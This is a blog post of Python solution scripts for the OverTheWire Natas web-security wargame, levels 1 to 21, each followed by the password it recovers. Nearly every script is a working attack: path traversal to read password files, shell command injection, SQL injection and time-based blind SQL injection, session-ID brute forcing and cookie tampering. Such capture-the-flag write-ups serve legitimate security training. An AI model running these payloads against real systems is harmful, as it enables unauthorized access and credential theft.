---
layout: post
title: natas
date: 2019-10-10 10:01
---
# Natas 1
```
import requests,re

username="natas0"
password="natas0"

url=str("http://%s.natas.labs.overthewire.org" %username)

r=requests.post(url,auth=(username,password))
print(r.text)

if re.findall('The password (.*)',r.text):
    print('good')
#<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```
# Natas 2
```
import requests,re

username="natas1"
password="gtVrDuiDfck831PqWsLEZy5gyDz1clto"

url=str("http://%s.natas.labs.overthewire.org" %username)

r=requests.post(url,auth=(username,password))
print(r.text)

if re.findall('The password (.*)',r.text):
    print('good')

#<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```
# Natas 3
```
import requests,re

username="natas2"
password="ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

url=str("http://%s.natas.labs.overthewire.org/files/users.txt" %username)

r=requests.post(url,auth=(username,password))
print(r.text)

#natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
# Natas 4
```
import requests,re

username="natas3"
password="sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

url=str("http://%s.natas.labs.overthewire.org/robots.txt" %username)

r=requests.post(url,auth=(username,password))
print(r.text)

#"User-agent: *
#Disallow: /s3cr3t/

url=str("http://%s.natas.labs.overthewire.org/s3cr3t/users.txt" %username)
r=requests.post(url,auth=(username,password))
print(r.text)

#natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
# Natas 5
```
import requests,re


username="natas4"
password="Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url=str("http://%s.natas.labs.overthewire.org" %username)
headers={"Referer":"http://natas5.natas.labs.overthewire.org/"}

r=requests.get(url,auth=(username,password),headers=headers)
print(r.text)

#Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

```
# Natas 6
```
import requests,re


username="natas5"
password="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url=str("http://%s.natas.labs.overthewire.org" %username)

r=requests.get(url,auth=(username,password))
print(r.cookies)

#<RequestsCookieJar[<Cookie loggedin=0 for natas5.natas.labs.overthewire.org/>]>

cookie={'loggedin':'1'}
r=requests.get(url,auth=(username,password),cookies=cookie)
print(r.text)

#Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
```
# Natas 7
```
import requests,re


username="natas6"
password="aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url=str("http://%s.natas.labs.overthewire.org/includes/secret.inc" %username)
r=requests.post(url,auth=(username,password))
print(r.text)

#<?
#secret = "FOEIUWGHFEEUHOFUOIU";
#?>
url=str("http://%s.natas.labs.overthewire.org/" %username)
r=requests.post(url,auth=(username,password),data={'secret':'FOEIUWGHFEEUHOFUOIU','submit':'submit'})
print(r.text)

#Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
# Natas 8
```
import requests,re

username="natas7"
password="7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url=str("http://%s.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8" %username)
r=requests.post(url,auth=(username,password))
print(r.text)

# natas8 : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
# Natas 9
```
import requests,re
import  base64

username="natas8"
password="DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"

url=str("http://%s.natas.labs.overthewire.org" %username)
Secret = "3d3d516343746d4d6d6c315669563362"
text=base64.b64decode(bytes.fromhex(Secret)[::-1])
text='oubWYf2kBq'
r=requests.post(url,auth=(username,password),data={'secret':text,'submit':'submit'})
print(r.text)

#Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
# Natas 10
```
import requests,re
import  base64

username="natas9"
password="W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url=str("http://%s.natas.labs.overthewire.org" %username)
r=requests.post(url,auth=(username,password),data={'needle':';cat /etc/natas_webpass/natas10;','submit':'submit'})
print(r.text)

#The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
# Natas 11
```
import requests

username="natas10"
password="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url=str("http://%s.natas.labs.overthewire.org" %username)
r=requests.post(url,auth=(username,password),data={'needle':'. /etc/natas_webpass/natas11 #','submit':'submit'})
print(r.text)

#The password for natas11 is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
# Natas 12
```
import requests

username="natas11"
password="U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"

url=str("http://%s.natas.labs.overthewire.org" %username)
cookie={'data':'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}
r=requests.post(url,auth=(username,password),cookies=cookie)
print(r.text)

#The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```
# Natas 13
```
import requests
import base64

username="natas12"
password="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url=str("http://%s.natas.labs.overthewire.org" %username)
r=requests.post(url,auth=(username,password),data={'filename':'test.php'},files={'uploadedfile':open('test.php','rb')})
print(r.text)

# the password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```
# Natas 15
```
import requests
import base64

username="natas14"
password="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url=str("http://%s.natas.labs.overthewire.org" %username)
r=requests.post(url,auth=(username,password),data={'username':'" or "1"="1" #'})
print(r.text)

# Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```
# Natas 16
```
import requests
import string,re

username="natas15"
password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url=str("http://%s.natas.labs.overthewire.org" %username)
passwr=[]
vocabulaire=string.ascii_uppercase+string.ascii_lowercase+string.digits
while(True):
    for ele in vocabulaire:
        r=requests.post(url,auth=(username,password),data={'username':'natas16" and BINARY password LIKE "'+''.join(passwr)+ele+'%" #'})
        if re.findall("This user doesn't exist",r.text):
            print("Waiting........",''.join(passwr)+ele)
        else:
            passwr+=[ele]
            print("good........", ''.join(passwr) + ele)
            
# The password for natas16 is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
# Natas 17
```
import requests
import string,re
import time

url="http://natas16.natas.labs.overthewire.org/"

username="natas16"
password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
header={"Content-Type": "image/jpeg"};
look=string.printable
pas=[]
count=0
vocabulaire=string.digits+string.ascii_uppercase+string.ascii_lowercase

while(True):
    for x in vocabulaire:
        r = requests.post(url, data={'needle': 'hello$(grep ^'+''.join(pas)+x+' /etc/natas_webpass/natas17)'},auth=(username, password))
        d = r.text
        if re.findall('hello',r.text):
            print('waiting..',''.join(pas)+x)
        else:
            pas+=[x]
            print('find on more',''.join(pas))
            
# the password natas17 : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```
# Natas 18
```
import requests
import string,re
import time

username="natas17"
password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url=str("http://%s.natas.labs.overthewire.org/"%username)
passwd=[]
vocabulaire=string.digits+string.ascii_uppercase+string.ascii_lowercase
while(True):
    for ele in vocabulaire:
        depart=time.time()
        r = requests.post(url,data={'username':'natas18" AND password LIKE binary "'+''.join(passwd)+ele+'%" AND sleep(2) #'},auth=(username, password))
        # binary for differenciate between upper case and lower case
        final=time.time()
        if (final-depart)>2:
            passwd+=[ele]
            print("goood......",''.join(passwd)+ele)
        else:
            print("waiting......", final-depart,'.....',''.join(passwd) + ele)
            
# the password natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```
# Natas 19
```
import requests
import  re

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

url = str("http://%s.natas.labs.overthewire.org/" % username)
for ele in range(650):
    cookies = dict(PHPSESSID=str(ele))
    r = requests.post(url,auth=(username, password),cookies=cookies)
    if r.text.find('You are logged in as a regular user')!=-1:
        print('regular user......',ele)
    else:
        print('you are logged in as an admin',ele)
        print(r.text)
        break
        
# the password natas19 : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  PHPSESSID=119
```
# Natas 20
```
import requests
import  binascii

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

url = str("http://%s.natas.labs.overthewire.org/" % username)
for i in range(641):
    s=requests.Session()
    cookie=dict(PHPSESSID=(str(i)+'-admin').encode("utf-8").hex())
    print(cookie)
    r = s.post(url,cookies=cookie,auth=(username, password))
    if r.text.find('You are logged in as a regular user')!=-1:
        print('regular user....',i)
    else:
        print("you are an admin ")
        print(r.text)
        break
        
# the password natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```
# Natas 21
```
import requests

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

url = str("http://%s.natas.labs.overthewire.org/?debug=true" % username)
s=requests.Session()
r = s.post(url,data={'name':'admin\nadmin 1'},auth=(username, password))
print(r.text)

print("##"*90)

r = s.post(url,auth=(username, password))
print(r.text)

# the password natas21 : IFekPyrQXftziDEsUr3x21sYuahypdgJ
```












